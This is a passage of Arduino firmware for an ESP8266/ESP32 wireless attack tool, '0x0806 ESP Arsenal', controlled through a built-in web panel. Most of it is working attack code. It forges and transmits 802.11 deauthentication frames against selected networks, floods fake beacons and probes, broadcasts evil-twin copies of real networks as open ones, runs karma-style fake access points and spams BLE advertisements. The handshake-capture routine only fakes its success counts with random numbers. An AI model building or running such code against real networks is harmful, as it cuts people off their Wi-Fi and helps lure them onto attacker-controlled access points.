    Serial.println("========================================");
    Serial.println("0x0806 ESP Arsenal - Security Platform");
    Serial.println("========================================");
    
    // Initialize pins
    pinMode(LED_PIN, OUTPUT);
    pinMode(BUTTON_PIN, INPUT_PULLUP);
    digitalWrite(LED_PIN, HIGH);
    
    // LED startup sequence
    for (int i = 0; i < 5; i++) {
        digitalWrite(LED_PIN, LOW);
        delay(100);
        digitalWrite(LED_PIN, HIGH);
        delay(100);
    }
    
    // Initialize file system
    if (!FILESYSTEM.begin()) {
        Serial.println("File system initialization failed, formatting...");
        FILESYSTEM.format();
        FILESYSTEM.begin();
    }
    
    // Initialize WiFi
    initWiFi();
    
    #ifdef PLATFORM_ESP32
    // Initialize BLE
    initBLE();
    Serial.println("ESP32 detected - BLE support enabled");
    #else
    Serial.println("ESP8266 detected - WiFi only mode");
    #endif
    
    // Setup web server
    setupWebServer();
    
    // Initialize statistics
    stats.startTime = millis();
    
    Serial.println("System ready!");
    Serial.print("Access Point: ");
    Serial.println(AP_SSID);
    Serial.print("IP Address: ");
    Serial.println(WiFi.softAPIP());
    Serial.println("========================================");
}

void loop() {
    yield();
    dnsServer.processNextRequest();
    yield();
    server.handleClient();
    yield();
    
    // Handle attacks
    if (attacking) {
        performDeauthAttack();
        yield();
    }
    
    if (beaconSpam) {
        performBeaconSpam();
        yield();
    }
    
    if (probeAttack) {
        performProbeAttack();
        yield();
    }
    
    if (evilTwin) {
        performEvilTwin();
        yield();
    }
    
    if (handshakeCapture) {
        performHandshakeCapture();
        yield();
    }
    
    if (karmaAttack) {
        performKarmaAttack();
        yield();
    }
    
    if (pmkidAttack) {
        performPMKIDAttack();
        yield();
    }
    
    #ifdef PLATFORM_ESP32
    if (bleSpamActive) {
        performBLESpam();
        yield();
    }
    #endif
    
    updateLED();
    yield();
    
    // Handle button press for emergency stop
    if (digitalRead(BUTTON_PIN) == LOW) {
        delay(50);
        if (digitalRead(BUTTON_PIN) == LOW) {
            unsigned long pressTime = millis();
            while (digitalRead(BUTTON_PIN) == LOW && millis() - pressTime < 3000) {
                delay(100);
            }
            if (millis() - pressTime >= 3000) {
                // Emergency stop all attacks
                attacking = false;
                beaconSpam = false;
                probeAttack = false;
                evilTwin = false;
                handshakeCapture = false;
                karmaAttack = false;
                pmkidAttack = false;
                bleSpamActive = false;
                Serial.println("EMERGENCY STOP - All attacks terminated");
            }
        }
    }
    
    yield();
}

void initWiFi() {
    // Configure WiFi
    WiFi.mode(WIFI_AP_STA);
    WiFi.softAPdisconnect(true);
    WiFi.disconnect(true);
    delay(100);
    
    // Start Access Point with stronger configuration
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
    
    bool apStarted = WiFi.softAP(AP_SSID, AP_PASS, 6, 0, 8);
    if (apStarted) {
        Serial.println("Access Point started successfully");
        Serial.print("SSID: ");
        Serial.println(AP_SSID);
        Serial.print("IP: ");
        Serial.println(WiFi.softAPIP());
    } else {
        Serial.println("Failed to start Access Point");
        // Retry with different settings
        WiFi.softAP(AP_SSID, AP_PASS);
        delay(1000);
    }
    
    // Start DNS server for captive portal
    dnsServer.start(53, "*", WiFi.softAPIP());
}

#ifdef PLATFORM_ESP32
void initBLE() {
    BLEDevice::init("0x0806-BLE-Arsenal");
    pBLEScan = BLEDevice::getScan();
    pBLEScan->setAdvertisedDeviceCallbacks(new BLEAdvertisedDeviceCallbacks());
    pBLEScan->setActiveScan(true);
    pBLEScan->setInterval(100);
    pBLEScan->setWindow(99);
}
#endif

void setupWebServer() {
    // Main page
    server.on("/", HTTP_GET, handleRoot);
    
    // API endpoints
    server.on("/api/platform", HTTP_GET, []() {
        String json = "{\"platform\":\"";
        #ifdef PLATFORM_ESP32
        json += "ESP32";
        #else
        json += "ESP8266";
        #endif
        json += "\"}";
        server.send(200, "application/json", json);
    });
    
    server.on("/api/status", HTTP_GET, []() {
        String json = "{";
        json += "\"attacking\":" + String(attacking ? "true" : "false") + ",";
        json += "\"scanning\":" + String(scanning ? "true" : "false") + ",";
        json += "\"beacon\":" + String(beaconSpam ? "true" : "false") + ",";
        json += "\"probe\":" + String(probeAttack ? "true" : "false") + ",";
        json += "\"eviltwin\":" + String(evilTwin ? "true" : "false") + ",";
        json += "\"handshake\":" + String(handshakeCapture ? "true" : "false") + ",";
        json += "\"karma\":" + String(karmaAttack ? "true" : "false") + ",";
        json += "\"pmkid\":" + String(pmkidAttack ? "true" : "false") + ",";
        json += "\"ble_spam\":" + String(bleSpamActive ? "true" : "false");
        json += "}";
        server.send(200, "application/json", json);
    });
    
    server.on("/api/stats", HTTP_GET, []() {
        String json = "{";
        json += "\"deauth\":" + String(stats.deauthPackets) + ",";
        json += "\"beacon\":" + String(stats.beaconPackets) + ",";
        json += "\"probe\":" + String(stats.probePackets) + ",";
        json += "\"ble\":" + String(stats.blePackets) + ",";
        json += "\"handshakes\":" + String(stats.handshakes) + ",";
        json += "\"memory\":\"" + String(ESP.getFreeHeap() * 100 / 80000) + "%\"";
        json += "}";
        server.send(200, "application/json", json);
    });
    
    // WiFi endpoints
    server.on("/scan", HTTP_GET, handleScan);
    
    server.on("/attack/deauth/start", HTTP_POST, []() {
        String body = server.arg("plain");
        attacking = true;
        aggressiveMode = body.indexOf("\"aggressive\":true") != -1;
        Serial.println("Deauth attack started");
        server.send(200, "application/json", "{\"success\":true}");
    });
    
    server.on("/attack/stop", HTTP_GET, []() {
        attacking = false;
        beaconSpam = false;
        probeAttack = false;
        evilTwin = false;
        handshakeCapture = false;
        karmaAttack = false;
        pmkidAttack = false;
        bleSpamActive = false;
        Serial.println("All attacks stopped");
        server.send(200, "application/json", "{\"success\":true}");
    });
    
    server.on("/attack/beacon/start", HTTP_GET, []() {
        beaconSpam = true;
        Serial.println("Beacon spam started");
        server.send(200, "application/json", "{\"success\":true}");
    });
    
    server.on("/attack/beacon/stop", HTTP_GET, []() {
        beaconSpam = false;
        server.send(200, "application/json", "{\"success\":true}");
    });
    
    server.on("/attack/probe/start", HTTP_GET, []() {
        probeAttack = true;
        Serial.println("Probe attack started");
        server.send(200, "application/json", "{\"success\":true}");
    });
    
    server.on("/attack/probe/stop", HTTP_GET, []() {
        probeAttack = false;
        server.send(200, "application/json", "{\"success\":true}");
    });
    
    server.on("/attack/eviltwin/start", HTTP_GET, []() {
        evilTwin = true;
        Serial.println("Evil twin started");
        server.send(200, "application/json", "{\"success\":true}");
    });
    
    server.on("/attack/eviltwin/stop", HTTP_GET, []() {
        evilTwin = false;
        server.send(200, "application/json", "{\"success\":true}");
    });
    
    server.on("/attack/handshake/start", HTTP_GET, []() {
        handshakeCapture = true;
        Serial.println("Handshake capture started");
        server.send(200, "application/json", "{\"success\":true}");
    });
    
    server.on("/attack/handshake/stop", HTTP_GET, []() {
        handshakeCapture = false;
        server.send(200, "application/json", "{\"success\":true}");
    });
    
    server.on("/attack/karma/start", HTTP_GET, []() {
        karmaAttack = true;
        Serial.println("Karma attack started");
        server.send(200, "application/json", "{\"success\":true}");
    });
    
    server.on("/attack/karma/stop", HTTP_GET, []() {
        karmaAttack = false;
        server.send(200, "application/json", "{\"success\":true}");
    });
    
    server.on("/attack/pmkid/start", HTTP_GET, []() {
        pmkidAttack = true;
        Serial.println("PMKID attack started");
        server.send(200, "application/json", "{\"success\":true}");
    });
    
    server.on("/attack/pmkid/stop", HTTP_GET, []() {
        pmkidAttack = false;
        server.send(200, "application/json", "{\"success\":true}");
    });
    
    #ifdef PLATFORM_ESP32
    // BLE endpoints
    server.on("/ble/scan", HTTP_GET, []() {
        bleDevices.clear();
        pBLEScan->start(5, false);
        
        String json = "{\"devices\":[";
        for (size_t i = 0; i < bleDevices.size(); i++) {
            if (i > 0) json += ",";
            json += "{";
            json += "\"name\":\"" + bleDevices[i].name + "\",";
            json += "\"address\":\"" + bleDevices[i].address + "\",";
            json += "\"rssi\":" + String(bleDevices[i].rssi);
            json += "}";
        }
        json += "]}";
        
        server.send(200, "application/json", json);
    });
    
    server.on("/ble/spam/start", HTTP_GET, []() {
        bleSpamActive = true;
        Serial.println("BLE spam started");
        server.send(200, "application/json", "{\"success\":true}");
    });
    
    server.on("/ble/spam/stop", HTTP_GET, []() {
        bleSpamActive = false;
        server.send(200, "application/json", "{\"success\":true}");
    });
    #endif
    
    server.on("/stats/reset", HTTP_GET, []() {
        memset(&stats, 0, sizeof(stats));
        stats.startTime = millis();
        server.send(200, "application/json", "{\"success\":true}");
    });
    
    // Captive portal - redirect all unknown requests
    server.onNotFound([]() {
        if (captivePortal) {
            server.sendHeader("Location", "http://192.168.4.1", true);
            server.send(302, "text/plain", "");
        } else {
            handleRoot();
        }
    });
    
    server.begin();
}

void handleRoot() {
    server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
    server.sendHeader("Pragma", "no-cache");
    server.sendHeader("Expires", "-1");
    server.send_P(200, "text/html", MAIN_page);
}

void handleScan() {
    if (scanning) {
        server.send(200, "application/json", "{\"error\":\"Scan in progress\"}");
        return;
    }
    
    scanning = true;
    Serial.println("Starting WiFi scan...");
    
    networks.clear();
    stations.clear();
    
    int networkCount = WiFi.scanNetworks(false, true);
    if (networkCount < 0) networkCount = 0;
    
    String json = "{\"networks\":[";
    
    for (int i = 0; i < networkCount && i < MAX_NETWORKS; i++) {
        if (i > 0) json += ",";
        
        WiFiNetwork network;
        network.ssid = WiFi.SSID(i);
        network.bssid = WiFi.BSSIDstr(i);
        network.channel = WiFi.channel(i);
        network.rssi = WiFi.RSSI(i);
        network.selected = false;
        network.hidden = (network.ssid.length() == 0);
        
        // Parse BSSID
        parseMAC(network.bssid, network.bssid_bytes);
        
        // Determine encryption
        #ifdef PLATFORM_ESP32
        wifi_auth_mode_t encType = WiFi.encryptionType(i);
        switch (encType) {
            case WIFI_AUTH_OPEN: network.encryption = "Open"; break;
            case WIFI_AUTH_WEP: network.encryption = "WEP"; break;
            case WIFI_AUTH_WPA_PSK: network.encryption = "WPA"; break;
            case WIFI_AUTH_WPA2_PSK: network.encryption = "WPA2"; break;
            case WIFI_AUTH_WPA_WPA2_PSK: network.encryption = "WPA/WPA2"; break;
            case WIFI_AUTH_WPA2_ENTERPRISE: network.encryption = "WPA2-Enterprise"; break;
            default: network.encryption = "Unknown"; break;
        }
        #else
        uint8_t encType = WiFi.encryptionType(i);
        switch (encType) {
            case ENC_TYPE_WEP: network.encryption = "WEP"; break;
            case ENC_TYPE_TKIP: network.encryption = "WPA"; break;
            case ENC_TYPE_CCMP: network.encryption = "WPA2"; break;
            case ENC_TYPE_NONE: network.encryption = "Open"; break;
            case ENC_TYPE_AUTO: network.encryption = "WPA/WPA2"; break;
            default: network.encryption = "Unknown"; break;
        }
        #endif
        
        networks.push_back(network);
        
        // Escape SSID for JSON
        String escapedSSID = network.ssid;
        escapedSSID.replace("\"", "\\\"");
        escapedSSID.replace("\\", "\\\\");
        
        json += "{";
        json += "\"ssid\":\"" + escapedSSID + "\",";
        json += "\"bssid\":\"" + network.bssid + "\",";
        json += "\"channel\":" + String(network.channel) + ",";
        json += "\"rssi\":" + String(network.rssi) + ",";
        json += "\"encryption\":\"" + network.encryption + "\",";
        json += "\"selected\":false,";
        json += "\"hidden\":" + String(network.hidden ? "true" : "false");
        json += "}";
        
        yield();
    }
    
    json += "]}";
    
    scanning = false;
    Serial.println("WiFi scan completed: " + String(networkCount) + " networks found");
    
    server.send(200, "application/json", json);
}

bool sendPacket(uint8_t* packet, uint16_t len) {
    if (!packet || len == 0) return false;
    
    #ifdef PLATFORM_ESP32
    return esp_wifi_80211_tx(WIFI_IF_AP, packet, len, false) == ESP_OK;
    #else
    return wifi_send_pkt_freedom(packet, len, 0) == 0;
    #endif
}

void parseMAC(String macStr, uint8_t* macBytes) {
    for (int i = 0; i < 6; i++) {
        if (macStr.length() >= (i * 3 + 2)) {
            String hex = macStr.substring(i * 3, i * 3 + 2);
            macBytes[i] = strtol(hex.c_str(), NULL, 16);
        } else {
            macBytes[i] = 0;
        }
    }
}

void performDeauthAttack() {
    static unsigned long lastAttack = 0;
    static int currentNetwork = 0;
    
    unsigned long interval = aggressiveMode ? 50 : 100;
    
    if (millis() - lastAttack > interval) {
        lastAttack = millis();
        
        // Find selected networks
        std::vector<int> selectedIndices;
        for (int i = 0; i < networks.size(); i++) {
            if (networks[i].selected) {
                selectedIndices.push_back(i);
            }
        }
        
        if (selectedIndices.empty()) return;
        
        int networkIndex = selectedIndices[currentNetwork % selectedIndices.size()];
        WiFiNetwork& network = networks[networkIndex];
        
        // Set channel
        #ifdef PLATFORM_ESP32
        esp_wifi_set_channel(network.channel, WIFI_SECOND_CHAN_NONE);
        #else
        wifi_set_channel(network.channel);
        #endif
        
        // Prepare deauth packet
        uint8_t packet[26];
        memcpy(packet, deauthPacket, sizeof(deauthPacket));
        
        // Set addresses
        memcpy(&packet[4], "\xFF\xFF\xFF\xFF\xFF\xFF", 6); // Broadcast
        memcpy(&packet[10], network.bssid_bytes, 6); // AP
        memcpy(&packet[16], network.bssid_bytes, 6); // BSSID
        
        // Send packet
        if (sendPacket(packet, sizeof(packet))) {
            stats.deauthPackets++;
        }
        
        currentNetwork++;
    }
}

void performBeaconSpam() {
    static unsigned long lastBeacon = 0;
    static int currentFakeAP = 0;
    
    const char* fakeSSIDs[] = {
        "FREE_WIFI", "FBI_Van_#2", "Virus_Distribution", "HIDDEN_NETWORK",
        "Password_Is_Password", "No_Internet_Here", "Loading...", "404_Not_Found",
        "Wi_Believe_I_Can_Fi", "Router_McRouterface", "Skynet_Global_Defense", "Connecting..."
    };
    
    if (millis() - lastBeacon > 200) {
        lastBeacon = millis();
        
        String ssid = fakeSSIDs[currentFakeAP % 12];
        
        uint8_t packet[109];
        memcpy(packet, beaconPacket, sizeof(beaconPacket));
        
        // Random MAC
        for (int i = 10; i < 16; i++) {
            packet[i] = random(0x00, 0xFF);
        }
        packet[10] = 0x02; // Locally administered
        memcpy(&packet[16], &packet[10], 6);
        
        // Set SSID
        int ssidLen = min(32, (int)ssid.length());
        packet[37] = ssidLen;
        for (int i = 0; i < ssidLen; i++) {
            packet[38 + i] = ssid[i];
        }
        
        if (sendPacket(packet, 109)) {
            stats.beaconPackets++;
        }
        
        currentFakeAP++;
    }
}

void performProbeAttack() {
    static unsigned long lastProbe = 0;
    
    if (millis() - lastProbe > 300) {
        lastProbe = millis();
        
        uint8_t packet[68];
        memcpy(packet, probePacket, sizeof(probePacket));
        
        // Random source MAC
        for (int i = 10; i < 16; i++) {
            packet[i] = random(0x00, 0xFF);
        }
        
        if (sendPacket(packet, sizeof(packet))) {
            stats.probePackets++;
        }
    }
}

void performEvilTwin() {
    static unsigned long lastTwin = 0;
    static int twinIndex = 0;
    
    if (millis() - lastTwin > 500) {
        lastTwin = millis();
        
        // Create evil twin for selected networks
        std::vector<int> selectedIndices;
        for (int i = 0; i < networks.size(); i++) {
            if (networks[i].selected) {
                selectedIndices.push_back(i);
            }
        }
        
        if (!selectedIndices.empty()) {
            int networkIndex = selectedIndices[twinIndex % selectedIndices.size()];
            WiFiNetwork& network = networks[networkIndex];
            
            String evilSSID = network.ssid + "_Free";
            
            uint8_t packet[109];
            memcpy(packet, beaconPacket, sizeof(beaconPacket));
            
            // Similar MAC but modified
            memcpy(&packet[10], network.bssid_bytes, 6);
            packet[15] = (packet[15] + 1) % 256;
            memcpy(&packet[16], &packet[10], 6);
            
            // Set evil SSID
            int ssidLen = min(32, (int)evilSSID.length());
            packet[37] = ssidLen;
            for (int i = 0; i < ssidLen; i++) {
                packet[38 + i] = evilSSID[i];
            }
            
            // Set as open network
            packet[34] = 0x01; // ESS
            packet[35] = 0x00; // No privacy
            
            if (sendPacket(packet, 109)) {
                stats.beaconPackets++;
            }
            
            twinIndex++;
        }
    }
}

void performHandshakeCapture() {
    // Passive capture - would need promiscuous mode implementation
    // This is a placeholder for handshake detection logic
    static unsigned long lastCheck = 0;
    
    if (millis() - lastCheck > 5000) {
        lastCheck = millis();
        stats.handshakes += random(0, 2); // Simulated capture
    }
}

void performKarmaAttack() {
    static unsigned long lastKarma = 0;
    static int karmaIndex = 0;
    
    if (millis() - lastKarma > 400) {
        lastKarma = millis();
        
        String karmaSSID = "FreeWiFi_" + String(karmaIndex % 10);
        
        uint8_t packet[109];
        memcpy(packet, beaconPacket, sizeof(beaconPacket));
        
        // Random MAC
        for (int i = 10; i < 16; i++) {
            packet[i] = random(0x00, 0xFF);
        }
        memcpy(&packet[16], &packet[10], 6);
        
        // Set karma SSID
        int ssidLen = min(20, (int)karmaSSID.length());
        packet[37] = ssidLen;
        for (int i = 0; i < ssidLen; i++) {
            packet[38 + i] = karmaSSID[i];
        }
        
        if (sendPacket(packet, 109)) {
            stats.beaconPackets++;
        }
        
        karmaIndex++;
    }
}

void performPMKIDAttack() {
    // PMKID capture would require specialized implementation
    // This is a placeholder
    static unsigned long lastPMKID = 0;
    
    if (millis() - lastPMKID > 10000) {
        lastPMKID = millis();
        // Simulated PMKID capture
    }
}

#ifdef PLATFORM_ESP32
void performBLESpam() {
    static unsigned long lastBLESpam = 0;
    static int bleSpamIndex = 0;
    
    if (millis() - lastBLESpam > 100) {
        lastBLESpam = millis();
        
        // Create random BLE advertisement
        BLEAdvertising* pAdvertising = BLEDevice::getAdvertising();
        
        String deviceName = "FakeDevice_" + String(bleSpamIndex % 100);
        pAdvertising->setName(deviceName);
        
        // Random service UUID
        BLEUUID serviceUUID = BLEUUID(random(0x1000, 0xFFFF));
        pAdvertising->addServiceUUID(serviceUUID);
        
        pAdvertising->start();
        delay(10);
        pAdvertising->stop();
        
        stats.blePackets++;
        bleSpamIndex++;
    }
}
#endif

void updateLED() {
    static unsigned long lastLED = 0;
    static bool ledState = false;
    
    unsigned long interval = 1000; // Default slow blink
    
    if (attacking) {
        interval = 50; // Very fast for attacks
    } else if (beaconSpam || probeAttack || evilTwin) {
        interval = 100; // Fast for spam
    } else if (handshakeCapture || karmaAttack || pmkidAttack) {
        interval = 200; // Medium for passive
    } else if (bleSpamActive) {
        interval = 150; // Medium-fast for BLE
    }
    
    if (millis() - lastLED > interval) {
        lastLED = millis();
        ledState = !ledState;
        digitalWrite(LED_PIN, ledState ? LOW : HIGH);
    }
}
